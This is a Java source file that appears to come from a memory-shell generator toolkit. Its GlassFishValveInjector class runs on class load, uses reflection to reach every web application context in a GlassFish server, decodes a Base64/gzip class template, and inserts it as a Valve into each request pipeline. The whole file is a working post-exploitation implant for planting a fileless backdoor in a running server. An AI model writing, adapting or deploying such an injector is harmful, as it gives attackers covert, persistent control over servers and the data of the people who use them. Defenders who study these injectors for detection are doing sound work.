package com.reajason.javaweb.memsell.glassfish.injector;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 */
public class GlassFishValveInjector {

    static {
        new GlassFishValveInjector();
    }

    public GlassFishValveInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object valve = getValve(context);
                if (valve == null) {
                    continue;
                }
                injectValve(context, valve);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @SuppressWarnings("all")
    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    @SuppressWarnings("all")
    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    private static synchronized Object invokeMethod(final Object obj, final String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(obj, methodName, new Class[0], new Object[0]);
    }

    @SuppressWarnings("all")
    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList<Object>();
        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
        try {
            for (Thread thread : threads) {
                if (thread.getName().contains("ContainerBackgroundProcessor")) {
                    Map<?, ?> childrenMap = (Map<?, ?>) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
                    for (Object key : childrenMap.keySet()) {
                        Map<?, ?> children = (Map<?, ?>) getFV(childrenMap.get(key), "children");
                        for (Object key1 : children.keySet()) {
                            Object context = children.get(key1);
                            if (context != null) {
                                contexts.add(context);
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return contexts;
    }

    @SuppressWarnings("all")
    private Object getValve(Object context) {
        Object valve = null;
        ClassLoader classLoader = context.getClass().getClassLoader();
        try {
            valve = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                valve = clazz.newInstance();
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        return valve;
    }

    @SuppressWarnings("all")
    public boolean isInjected(Object context, String valveClassName) throws Exception {
        Object obj = invokeMethod(context, "getPipeline");
        Object[] valves = (Object[]) invokeMethod(obj, "getValves");
        List<Object> valvesList = Arrays.asList(valves);
        for (Object valve : valvesList) {
            if (valve.getClass().getName().contains(valveClassName)) {
                return true;
            }
        }
        return false;
    }

    @SuppressWarnings("all")
    public void injectValve(Object context, Object valve) throws Exception {
        if (isInjected(context, valve.getClass().getName())) {
            System.out.println("valve already injected");
            return;
        }
        try {
            Class valveClass;
            String valveClassName = "org.apache.catalina.Valve";
            valveClass = context.getClass().getClassLoader().loadClass(valveClassName);
            Object obj = invokeMethod(context, "getPipeline");
            invokeMethod(obj, "addValve", new Class[]{valveClass}, new Object[]{valve});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public ClassLoader getCatalinaLoader() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
        ClassLoader catalinaLoader = null;
        for (Thread thread : threads) {
            // 适配 v5 的 Class Loader 问题
            if (thread.getName().contains("ContainerBackgroundProcessor")) {
                catalinaLoader = thread.getContextClassLoader();
                break;
            }
        }
        return catalinaLoader;
    }
}